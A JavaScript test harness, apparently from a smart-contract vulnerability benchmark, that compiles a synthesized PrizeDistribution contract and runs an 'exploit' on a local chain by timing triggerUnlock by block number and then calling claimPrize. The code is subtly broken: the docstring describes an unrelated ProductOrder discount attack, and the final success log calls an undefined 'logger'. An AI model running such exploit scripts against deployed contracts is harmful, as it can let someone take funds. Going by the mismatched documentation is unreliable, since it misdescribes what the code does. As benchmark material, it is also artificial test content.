require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');

const { setTimeout } = require('timers');
const { sleep } = require('@lib/os/process');
const { createLoggerWeb3 } = require('@lib/web3/deploy');

// It seems module alias does not work with js path, so, we will resort to the dirty approach.
const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
const contractFileFullName = 'PrizeDistribution-7.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');
let solcVersion = extractSolcVersion(source);


/**
 * Attempts to exploit a vulnerability in the ProductOrder smart contract.
 * 
 * The exploit involves applying a discount just before the discountEndTime, 
 * waiting for a few seconds, then making a transaction to pay for the order 
 * at the discounted price, and finally confirming the order.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the exploit is successful, `false` otherwise.
 * @throws {Error} If there's an error during the exploit process.
 */
async function exploit(web3, envInfo, contractAddress) {
    try {
        let { abi } = await compileWithVersion(source, contractFileFullName, 'PrizeDistribution', solcVersion);
        let contractInstance = new web3.eth.Contract(abi, contractAddress);
        let organizerAccount = envInfo.accounts[0];
        let beneficiaryAccount = envInfo.accounts[1];

        console.log("Monitoring block number to perfectly time the unlock trigger...");

        let currentBlock = await web3.eth.getBlockNumber();
        let lastBlockChecked = await contractInstance.methods.lastBlockChecked().call();

        console.log(`Current block: ${currentBlock}, Last block checked: ${lastBlockChecked}`);

        // Calculate when to execute the trigger based on block numbers
        if (currentBlock <= lastBlockChecked + 100) {
            let waitForBlock = lastBlockChecked + 101 - currentBlock;
            console.log(`Waiting for ${waitForBlock} more blocks...`);
            await new Promise(resolve => setTimeout(resolve, waitForBlock * 15000)); // Approximate wait time based on average block time
        }

        // Trigger the unlock
        let triggerTx = await contractInstance.methods.triggerUnlock().send({
            from: organizerAccount,
            gas: 300000
        });

        console.log(`Trigger transaction status: ${triggerTx.status}`);

        if (!triggerTx.status) {
            console.error("Failed to trigger unlock!");
            return false;
        }

        // Attempt to claim the prize
        let claimTx = await contractInstance.methods.claimPrize().send({
            from: beneficiaryAccount,
            gas: 300000
        });

        if (claimTx.status) {
            console.log("Prize successfully claimed with triggered unlock!");
            return true; // Exploit successful
        } else {
            console.error("Failed to claim the prize even after triggering unlock!");
            return false; // Exploit failed
        }
    } catch (error) {
        console.error(error.stack);
        return false;
    }
}














/**
 * Executes the exploit and checks its result
 * 
 * This function will run the exploit and then verify if the exploit has 
 * yielded the predicted result. If the exploit is successful, a success 
 * message is displayed, otherwise an error message is shown.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the test is successful, `false` otherwise.
 * @throws {Error} If there's an error during the test execution.
 */
module.exports = async function runTests(web3, envInfo, contractAddress) {
    // envInfo.accounts, envInfo.privateKeys, and envInfo.rpcAddress should be available from Anvil 
    
    web3 = await createLoggerWeb3(web3);
    // Execute the exploit
    let result = await exploit(web3, envInfo, contractAddress);

    // See if exploit has yielded the predicted result (a very manual oracle!)
    assert.strictEqual(result, true, "Exploit did not yield the expected result");
    logger.info(chalk.green("Exploit successful!"));

    return result; 
}
